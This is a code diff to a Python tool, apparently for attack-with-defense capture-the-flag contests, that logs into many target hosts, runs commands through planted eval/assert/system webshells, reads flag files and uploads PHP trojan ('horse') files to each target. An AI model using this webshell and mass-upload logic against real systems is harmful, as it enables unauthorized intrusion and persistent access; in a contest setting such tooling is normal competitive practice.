@@ -8,6 +8,7 @@ from libs.OutputColor import Color
 from config.config import Config
 from libs.Tips import Remove
 
+
 class Awd:
 
     def __init__(self):
@@ -42,13 +43,6 @@ class Awd:
                         break
                 except:
                     print(Color('Please input WebShellIndex(1~n)\n', 'red').print())
-
-        # webshell_type = None
-        # try:
-        #     webshell_type = self.webshells[shellIndex]['type']
-        # except Exception as e:
-        #     errorMessage = 'No WebShell!' + str(e) + '\n'
-        #     print(Color(errorMessage, 'red').print())
 
         print(Color('If you want to upload webshell-horse, please input \'horse\'\nIf you want to execute command, please input \'command\'\nPress Ctrl+C to end operate!\n', 'yellow').print())
         inputSelect = input('[+] inputSelect> ').strip().lower()
@@ -102,7 +96,7 @@ class Awd:
                 payload = input('[+] shell_exec_payload> ').strip()
 
             for target in self.Targets.targets:
-                message = '[+] {}:{}    ====>    '.format(target['ip'], target['port'])
+                message = '[+] {}:{}'.format(target['ip'], target['port'])
                 print(Color(message, 'fuchsia').print())
                 self.AttackRequest.handle_login(target)
                 execute_result = self.AttackRequest.handle_execute_command(target, webshell, payload)
@@ -110,8 +104,6 @@ class Awd:
 
         elif webshell['WebShell_type'] == 'readfile' or webshell['WebShell_type'] == 'include' or webshell['WebShell_type'] == 'require' or webshell['WebShell_type'] == 'file_get_contents' or webshell['WebShell_type'] == 'include_once' or webshell['WebShell_type'] == 'require_once':
             """直接读取FLAG"""
-            if not Config.flag_format:
-                print(Color('This mode can\'t set Config.flag_format None', 'red').print())
 
             if webshell['WebShell_type'] == 'readfile':
                 file_path = input('[+] readfile_filePath> ')
@@ -127,7 +119,7 @@ class Awd:
                 file_path = input('[+] require_once_filePath> ')
 
             for target in self.Targets.targets:
-                message = '[+] {}:{}    ====>    '.format(target['ip'], target['port'])
+                message = '[+] {}:{}'.format(target['ip'], target['port'])
                 print(Color(message, 'fuchsia').print())
                 self.AttackRequest.handle_login(target)
                 read_result = self.AttackRequest.handle_read_file(target, webshell, file_path)
@@ -139,12 +131,12 @@ class Awd:
 
 
     def upload_horse(self, webshell):
-        if webshell['type'] == 'eval' or webshell['type'] == 'assert':
+        if webshell['WebShell_type'] == 'eval' or webshell['WebShell_type'] == 'assert' or webshell['WebShell_type'] == 'system':
             print(Color('Please input the horse_name you need.', 'yellow').print())
             horse_name = input('[+] horse_name> ').strip()
             if os.path.exists('horse/' + str(horse_name) + '.php'):
                 for target in self.Targets.targets:
-                    message = '[+] {}:{}    ====>    '.format(target['ip'], target['port'])
+                    message = '[+] {}:{}'.format(target['ip'], target['port'])
                     print(Color(message, 'fuchsia').print())
                     self.AttackRequest.handle_login(target)
                     upload_result = self.AttackRequest.handle_upload_horse(target, webshell, horse_name)
